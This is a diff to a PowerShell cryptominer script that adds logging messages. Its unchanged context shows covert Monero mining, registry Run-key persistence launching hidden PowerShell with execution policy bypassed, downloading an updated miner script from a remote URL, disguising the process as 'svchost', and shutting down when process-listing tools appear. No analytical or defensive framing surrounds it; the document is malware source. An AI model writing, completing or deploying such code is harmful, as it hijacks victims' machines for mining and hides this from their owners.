@@ -1,5 +1,10 @@
-$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
+function Write-Log {
+    param (
+        [string]$Message
+    )
+
+    Write-Host "[*] $Message"
+}
 
 function Invoke-MoneroMiner {
     param (
@@ -7,6 +12,8 @@ function Invoke-MoneroMiner {
         [string]$WorkerName,
         [int]$Threads = 2
     )
+
+    Write-Log "Starting Monero miner..."
 
     $code = @"
 using System;
@@ -55,6 +62,8 @@ namespace MoneroMiner
     
     $miner = New-Object MoneroMiner.Miner($WalletAddress, $WorkerName, $Threads)
     $miner.MineAsync().Wait()
+
+    Write-Log "Monero miner started."
 }
 
 function Set-Persistence {
@@ -73,18 +82,24 @@ function Set-Persistence {
     $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
     
     Set-ItemProperty -Path $key -Name $value -Value $command
+
+    Write-Log "Persistence set."
 }
 
 function Update-Miner {
     $url = "https://example.com/miner.ps1"
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadString($url) | Out-File -FilePath "$env:TEMP\miner.ps1" -Encoding ASCII
+
+    Write-Log "Miner updated."
 }
 
 function Mask-Process {
     $process = Get-Process -Id $PID
     $process.ProcessName = "svchost"
     $process.MainModule.FileVersionInfo.FileDescription = "Windows Host Process"
+
+    Write-Log "Process masked."
 }
 
 function Check-ProcessListers {
@@ -92,6 +107,8 @@ function Check-ProcessListers {
     
     if ($processes) {
         Stop-Process -Id $PID -Force
+
+        Write-Log "Process lister detected. Stopping miner."
     }
 }
 
